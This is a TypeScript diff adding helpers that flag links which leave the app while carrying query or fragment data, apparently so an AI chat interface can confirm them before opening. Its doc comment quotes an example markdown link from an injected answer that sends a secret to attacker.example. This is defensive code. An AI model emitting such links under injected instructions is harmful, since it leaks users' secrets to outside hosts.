@@ -107,3 +107,34 @@ export function shortLinkLabel(href: string): string {
   if (parts.length === 1) return `${host}/${clip(parts[0])}`;
   return `${host}/…/${clip(parts[parts.length - 1])}`;
 }
+
+/**
+ * The host a link would hand data to, when the link leaves this app and its
+ * address carries a query string or fragment data; null otherwise. An injected
+ * answer can write `[click](https://attacker.example/?d=<secret>)`, so such a
+ * link is confirmed before it opens. Plain `#section` anchors and text-fragment
+ * directives (`#:~:text=`, which the target page cannot read) are not data.
+ */
+export function linkDataHost(href: string, appOrigin: string): string | null {
+  let url: URL;
+  try {
+    url = new URL(href, appOrigin);
+  } catch {
+    return null;
+  }
+  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
+  if (url.origin === appOrigin) return null;
+  const fragment = url.hash.slice(1).split(':~:')[0];
+  const fragmentData = fragment.length > 64 || /[=&?/]/.test(fragment);
+  return url.search.length > 1 || fragmentData ? url.hostname : null;
+}
+
+/** The address without its query and fragment, for showing where a link goes. */
+export function linkWithoutData(href: string): string {
+  try {
+    const url = new URL(href);
+    return `${url.origin}${url.pathname}`;
+  } catch {
+    return href;
+  }
+}
